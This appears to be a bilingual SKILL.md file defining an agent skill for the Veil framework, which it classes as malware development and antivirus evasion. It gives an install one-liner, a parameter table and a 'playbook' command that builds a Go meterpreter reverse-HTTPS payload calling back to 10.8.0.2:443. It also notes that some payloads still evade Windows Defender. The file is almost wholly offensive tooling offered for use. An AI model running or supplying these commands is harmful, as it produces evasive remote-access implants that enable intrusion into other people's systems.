---
name: veil-framework
description: "Veil: Evasion payload generation. Signals: malware development, evasion development, menu, list payloads, interactive selection."
zh-signals: "Veil: 免杀载荷生成。信号:恶意软件开发,免杀开发,菜单,列 payload,交互选择。"
---

# Veil

- 攻击大类:C45 恶意软件开发与免杀
- 上游仓库:https://github.com/Veil-Framework/Veil
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/Veil-Framework/Veil && cd Veil && ./config/setup.sh --force --silent
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `./Veil.py` | 菜单 |
| `./Veil.py -t Evasion -p go/meterpreter/rev_https.py --lhost x --lport 443 -o payload` | 生成 |
| `list` | 列 payload |
| `use 1` | 交互选择 |

## 攻击场景 Playbook

### 免杀载荷生成

```bash
./Veil.py -t Evasion -p go/meterpreter/rev_https.py --lhost 10.8.0.2 --lport 443 -o agent
# Go/Python/C 多语言 payload,部分仍免杀 Windows Defender
```

## 注意事项

老牌免杀框架,生成 Python/Go/C 载荷;需配合最新 EDR 环境实测免杀率。
